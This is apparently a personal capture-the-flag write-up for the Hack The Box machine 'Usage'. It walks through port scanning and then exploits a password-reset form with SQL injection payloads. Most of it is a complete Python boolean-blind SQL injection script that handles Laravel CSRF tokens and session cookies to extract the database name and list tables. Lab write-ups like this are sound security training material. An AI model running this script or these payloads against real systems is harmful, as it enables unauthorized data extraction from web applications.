---
title: Usage
draft: false
tags:
---

![[Usage.png]]

Machine: https://app.hackthebox.com/machines/Usage

---
# Enumeration
## Port  Scanning
- Lets start with the classical port scanning and get the service and version running, using  [[content/Tools/Activas/3. Escaneo de puertos/nmap|nmap]]
```bash
nmap -p- -sS -n -Pn --min-rate 5000 10.10.11.18
nmap -p22,80 -sVC -Pn -n --min-rate 5000 22,80 10.10.11.18
```
>[!example]- Result
>![[Pasted image 20250320105013.png]]

## Web Site
- Lets get the tecnologies running on this web page using [[wappanalyzer]] and [[whatweb]]
```bash
whatweb http://usage.htb/
```
>[!example]- Result
>![[Pasted image 20250320105352.png]]
>![[Pasted image 20250320105431.png]]

- the web side allow us to register, login and there is a "reset password form" and seems to be vulnerable to SQLi
```bash
1' or '1' = '1' -- -
```
>[!example]- Result
>![[Pasted image 20250320121039.png]]
>![[Pasted image 20250320121012.png]]

# Exploitation
- maybe we can try to get a valid email using a script, lets check some SQLi
```
test@test.com' and substring(database(),1,1) = 'U' -- -
```
>[!example]- Result
>![[Pasted image 20250320141831.png]]
>![[Pasted image 20250320141756.png]]

- nice lets make a python  script to automate this process, I have noticed that, when u send the post request, the server respond with a 302 redirect, with some cookies, and the final respond appear when u use this cookies into a GET repuest, so this is my code:
```python
#!/usr/bin/python3

import signal, sys, time, requests
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# CTRL + C  
signal.signal(signal.SIGINT, def_handler)

def makeSQLi():
    final_string = ""
    p1 = log.progress("Brute Force")
    p1.status("Starting attack")
    time.sleep(2)

    p2 = log.progress("Value")

    main_url = "http://usage.htb/forget-password"
    characters = string.printable
    headers = {
        "Host": "usage.htb",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "http://usage.htb/forget-password",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0"
    }

    for position in range(1,50):
        for character in characters:
            # Post data
            post_data = {
                "_token": None,
                #"email": "test@test.com' and substring(database(),1,1=) 'U'-- -"
                "email": "test@test.com' and substring(database(),%d,1) = '%s' -- -" % (position, character) 
            }
            # Cookies to send
            cookies = {
                "XSRF-TOKEN": None,
                "laravel_session": None
            }

            # 1st send a get recuest with out cookies
            r = requests.get(main_url)
            values = getCookiesValues(r.headers.get('Set-Cookie'))
            cookies["XSRF-TOKEN"] = values[0]
            cookies["laravel_session"] = values[1]
            # Code to find "_token" value on HTML
            start = r.text.find('value="') + len('value="')
            end = r.text.find('"', start)
            token = r.text[start:end]
            post_data["_token"] = token
            #print(headers)
            #print(post_data)
            #print(cookies)
            #--------------------------------------------------------------------------------------------------------
        
            # 2nd Sending POST recuest
            r = requests.post(main_url,headers=headers, cookies=cookies,data=post_data, allow_redirects=False)
            #print(r.status_code)
            #--------------------------------------------------------------------------------------------------------
            # 3rd Update cookies and get que server response
            r = requests.get(main_url, cookies=cookies)
            #print(r.status_code)
            #print(r.text)

            if "We have e-mailed your password reset link to" in r.text:
                final_string += character
                p2.status(final_string)
                break


    sys.exit(0)

def getCookiesValues(set_cookie):
    for cookie in set_cookie.split(','):
        if 'XSRF-TOKEN' in cookie:
            xsrf_token = cookie.split('=')[1].split(';')[0]
        if 'laravel_session' in cookie:
            laravel_session = cookie.split('=')[1].split(';')[0]
    return [xsrf_token,laravel_session]

if __name__ == '__main__':
    makeSQLi()
```

>[!exmple]- Result
>![[Pasted image 20250320174540.png]]

The script run slow but works, we are getting the database name
Database name: `usage_blog`
- now we can modify the script to get the value we want, for example lets list the tables of this data base `1' or substring((SELECT GROUP_CONCAT(TABLE_NAME SEPARATOR ', ') FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'asuge_blog'),1,1) = 'a' -- -`

